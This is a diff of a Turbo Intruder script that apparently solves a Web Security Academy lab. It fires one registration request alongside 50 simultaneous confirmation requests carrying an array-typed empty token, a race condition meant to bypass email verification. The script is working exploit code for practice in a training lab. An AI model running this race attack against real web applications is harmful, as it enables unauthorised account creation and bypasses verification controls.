@@ -1,30 +1,29 @@
 def queueRequests(target, wordlists):
-
     engine = RequestEngine(endpoint=target.endpoint,
-                            concurrentConnections=1,
-                            engine=Engine.BURP2
-                            )
-    
-    token_req = '''POST /confirm?token[]= HTTP/2
-Host: 0aa400630352a7a7804c44420040003a.web-security-academy.net
-Cookie: phpsessionid=yPvtc5Q1o41RYihUGBETOIrqSeZLrLK2
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+    # replace your `phpsessionid` session cookie in here
+    confirmTokenRequest = '''POST /confirm?token[]= HTTP/2
+Host: .web-security-academy.net
+Cookie: phpsessionid=
 Content-Length: 0
+
 '''
+    MIN_ATTEMPT = 1
+    MAX_ATTEMPT = 20
+    for usernamePrefix in range(MIN_ATTEMPT, MAX_ATTEMPT):
+        currentQueue = 'queue' + str(usernamePrefix)
+        # prepare 1 registration request
+        engine.queue(target.req, str(usernamePrefix), gate=currentQueue)
 
+        # prepare x number of confirm token requests
+        CONFIRM_REQUEST_NUMBER = 50
+        for confirmRequest in range(CONFIRM_REQUEST_NUMBER):
+            engine.queue(confirmTokenRequest, gate=currentQueue)
 
-    for i in range(20):
-        username = "qweqwe" + str(i)        
-        engine.queue(target.req, username, gate=str(i))
-        
-        for confirm in range(50):
-            engine.queue(token_req, gate=str(i))
-            
-         
-        engine.openGate(str(i))
-
-
-@MatchStatus(200)
-@MatchRegex(r".*successful.*"
+        # send all prepared requests at the same time
+        engine.openGate(currentQueue)
 
 def handleResponse(req, interesting):
     table.add(req)
